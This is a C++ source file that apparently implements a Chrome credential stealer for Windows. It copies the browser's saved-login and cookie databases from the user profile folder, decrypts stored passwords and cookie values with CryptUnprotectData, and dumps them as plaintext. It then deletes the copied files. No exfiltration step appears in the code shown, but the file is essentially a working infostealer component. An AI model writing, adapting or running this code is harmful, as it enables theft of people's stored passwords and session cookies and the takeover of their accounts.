#include <stdio.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <tchar.h>
#include <windows.h>
#include <Wincrypt.h>
#include "sqlite3.h"

#pragma warning(disable:4996)
#pragma comment(lib, "Crypt32")
#define _WIN32_WINNT _WIN32_WINNT_WIN7
#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)
using namespace std;

stringstream GetSaveAccounts(sqlite3 *db)
{
	stringstream dump(string(""));
	const char *sql = "SELECT action_url, username_value, password_value FROM logins";
	sqlite3_stmt *pStmt;
	int rc;

	rc = sqlite3_prepare(db, sql, -1, &pStmt, 0);
	if (rc != SQLITE_OK)
	{
		return dump;
	}

	rc = sqlite3_step(pStmt);
	while (rc == SQLITE_ROW)
	{
		dump << sqlite3_column_text(pStmt, 0) << endl;
		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;

		DATA_BLOB encryptedPass, decryptedPass;
		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		while (isprint(*c))
		{
			dump << *c;
			c++;
		}
		dump << endl;
		rc = sqlite3_step(pStmt);
	}
	rc = sqlite3_finalize(pStmt);

	return dump;
}

stringstream GetCookies(sqlite3 *db)
{
	stringstream dump(string(""));
	const char *sql = "SELECT HOST_KEY, path, encrypted_value from cookies";
	sqlite3_stmt *pStmt;
	int rc;

	rc = sqlite3_prepare(db, sql, -1, &pStmt, 0);
	if (rc != SQLITE_OK)
	{
		return dump;
	}

	rc = sqlite3_step(pStmt);
	while (rc == SQLITE_ROW)
	{
		dump << sqlite3_column_text(pStmt, 0) << endl;
		dump << (char *)sqlite3_column_text(pStmt, 1) << endl;

		DATA_BLOB encryptedPass, decryptedPass;

		encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
		encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);

		memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

		CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
		char *c = (char *)decryptedPass.pbData;
		while (isprint(*c))
		{
			dump << *c;
			c++;
		}
		dump << endl;
		rc = sqlite3_step(pStmt);
	}
	rc = sqlite3_finalize(pStmt);

	return dump;
}

sqlite3 *GetDBHandler(char* dbFilePath)
{
	sqlite3 *db;
	int rc = sqlite3_open(dbFilePath, &db);
	if (rc)
	{
		sqlite3_close(db);
		return nullptr;
	}
	else
	{
		return db;
	}
}

BOOL CopyDB(char *source, char *dest)
{
	try
	{
		string path = getenv("LOCALAPPDATA");
		path.append("\\Google\\Chrome\\User Data\\Default\\");
		path.append(source);
		ifstream  src(path, std::ios::binary);
		ofstream  dst(dest, std::ios::binary);
		dst << src.rdbuf();
		dst.close();
		src.close();

		return TRUE;
	}
	catch (...)
	{
		return FALSE;
	}
}

BOOL DeleleDB(const char *fileName)
{
	if (remove(fileName) != 0)
		return FALSE;

	return TRUE;
}